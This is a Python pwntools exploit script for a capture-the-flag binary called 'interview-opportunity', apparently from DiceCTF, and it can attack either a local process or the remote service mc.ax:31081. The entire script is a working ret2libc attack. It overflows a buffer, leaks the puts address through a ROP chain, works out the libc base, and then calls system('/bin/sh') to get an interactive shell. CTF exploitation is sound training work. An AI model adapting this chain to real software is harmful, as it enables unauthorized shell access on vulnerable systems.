from pwn import *

local = True

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = context.binary = ELF("./interview-opportunity")

rop = ROP(elf)

if local:
 r = process(elf.path)
else:
 libc = ELF("./libc_server.so")
 r = remote("mc.ax", 31081)


padding = b"DJWK1LTXG1U6B5RSK1HC9V5WCIMKRXGK25"
r.recvuntil(b"So tell us. Why should you join DiceGang?\n")

rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])

payload = padding + bytes(rop)

r.sendline(payload)
r.recvline()
r.recvline()

puts_leak = u64(r.recv(6)+b"\x00"*2)
info("Leak puts: "+str(hex(puts_leak)))

libc.address = puts_leak - libc.symbols["puts"]

rop2 = ROP(libc)
RET = rop2.find_gadget(["ret"])
rop2.raw(RET) #call ret gadget to not crash the program
rop2.system(next(libc.search(b"/bin/sh")))


r.recvuntil(b"So tell us. Why should you join DiceGang?\n")
r.sendline(padding+bytes(rop2))


r.interactive()
